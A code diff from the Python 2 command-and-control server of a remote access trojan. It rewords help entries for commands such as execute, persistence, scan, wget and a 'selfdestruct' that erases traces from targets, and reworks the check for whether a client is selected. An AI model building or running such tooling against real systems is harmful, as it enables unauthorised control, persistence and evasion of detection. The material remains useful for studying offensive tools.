@@ -34,7 +34,7 @@ cat <file>          | Output a file to the screen.
 client <id>         | Connect to a client.
 clients             | List connected clients.
 execute <command>   | Execute a command on the target.
-goodbye             | Exit the server and selfdestruct all clients.
+goodbye             | Teardown the server and selfdestruct all clients.
 help                | Show this help menu.
 kill                | Kill the client connection.
 ls                  | List files in the current directory.
@@ -42,7 +42,7 @@ persistence         | Apply persistence mechanism.
 pwd                 | Get the present working directory.
 quit                | Exit the server and keep all clients alive.
 scan <ip>           | Scan top 25 TCP ports on a single host.
-selfdestruct        | Remove all traces of the RAT from the target system.
+selfdestruct        | Remove all traces of the RAT from a target system.
 survey              | Run a system survey.
 unzip <file>        | Unzip a file.
 wget <url>          | Download a file from the web.'''
@@ -202,16 +202,18 @@ def main():
         cmd, _, action = prompt.partition(' ')
 
         if cmd in server_commands:
-            server_commands[cmd](action)
+            if cmd in ['client', 'clients', 'help', 'quit'] or ccid != '?':
+                server_commands[cmd](action)
+            else:
+                print 'Error: No client selected.'
 
         elif cmd in CLIENT_COMMANDS:
-            if ccid == '?':
+            if ccid != '?':
+                print 'Running {}...'.format(cmd)
+                server.send_client(prompt, server.current_client)
+                server.recv_client(server.current_client)
+            else:
                 print 'Error: No client selected.'
-                continue
-
-            print 'Running {}...'.format(cmd)
-            server.send_client(prompt, server.current_client)
-            server.recv_client(server.current_client)
 
         else:
             print 'Invalid command, type "help" to see a list of commands.'
